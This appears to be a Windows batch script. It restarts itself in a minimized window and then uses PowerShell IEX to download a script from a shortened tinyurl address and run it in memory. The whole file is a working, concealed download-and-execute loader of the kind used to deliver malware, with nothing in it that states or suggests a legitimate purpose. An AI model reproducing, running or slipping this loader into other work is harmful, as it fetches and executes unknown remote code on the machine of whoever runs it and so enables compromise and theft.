@echo off
if "%1"=="done" goto runtime
start "" /min %0 done
exit

:runtime
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')